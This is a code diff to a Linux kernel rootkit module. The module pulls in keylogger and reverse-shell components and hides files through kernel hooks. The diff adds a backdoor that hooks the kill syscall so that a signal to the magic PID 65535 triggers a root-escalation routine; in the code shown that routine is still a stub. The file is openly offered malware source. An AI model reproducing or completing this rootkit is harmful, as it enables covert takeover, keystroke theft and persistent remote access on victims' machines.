@@ -5,10 +5,12 @@
  */
 #include <linux/fs.h>
 #include <linux/init.h>
+#include <linux/types.h>
 #include <linux/jiffies.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/timer.h>
+#include <linux/syscalls.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
@@ -37,7 +39,6 @@ typedef struct commands {
     // TODO: Add properties for each of the commands we can accept
     char *rev_shell_ip;
     // TODO: Add toggle for enabling and disabling hidden files.
-    bool escalate_privs;
     bool keylogger;
 } commands;
 
@@ -46,6 +47,7 @@ typedef struct commands {
  */
 
 #define POLLING_INTERVAL 1500
+#define ROOT_PRIV_ESC_MAGIC 65535 // Highest PID on a 64-bit OS. TODO: Make 32/64 compat.
 static _timer polling_timer;
 struct commands cmds;
 
@@ -66,9 +68,6 @@ MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
 static char *hidden_file_prefix = NULL;
 module_param(hidden_file_prefix, charp, 0770);
 MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
-static bool escalate_privileges = false;
-module_param(escalate_privileges, bool, 0770);
-MODULE_PARM_DESC(escalate_privileges, "Toggle for escalating current user to root.");
 static bool keylogger = false;
 module_param(keylogger, bool, 0770);
 MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");
@@ -77,6 +76,7 @@ MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");
  * Forward declarations
  */
 
+static long get_root();
 static void poll_for_commands(unsigned long data);
 
 /**
@@ -157,6 +157,28 @@ struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *
 }
 
 /**
+ * Privilege Escalation with Magic Command
+ */
+
+/**
+ * Drops the current user into a root shell.
+ */
+static long get_root() {
+	printk(KERN_EMERG "One root coming right up.");
+	// TODO
+	return 0;
+}
+
+KHOOK(sys_kill);
+static long khook_sys_kill(pid_t pid, int sig) {
+	if (pid == ROOT_PRIV_ESC_MAGIC) {
+		return get_root();
+	} else {
+		return KHOOK_ORIGIN(sys_kill, pid, sig);
+	}
+}
+
+/**
  * Timer and Command Polling Functions
  * Adapted from: https://github.com/aircrack-ng/rtl8812au/commit/f221a169f281dab9756a176ec2abd91e0eba7d19
  */
@@ -219,13 +241,11 @@ static void poll_for_commands(unsigned long data) {
 
     // TODO: Check for change in hidden file hiding
     // TODO: Check for keylogger enabling
-    // TODO: Check for escalating to root privs.
     set_timer(&polling_timer);
 }
 
 static void copy_params_into_cmd_struct(commands *cmd) {
     cmd->rev_shell_ip = rev_shell_ip;
-    cmd->escalate_privs = escalate_privileges;
     cmd->keylogger = keylogger;
 }
 
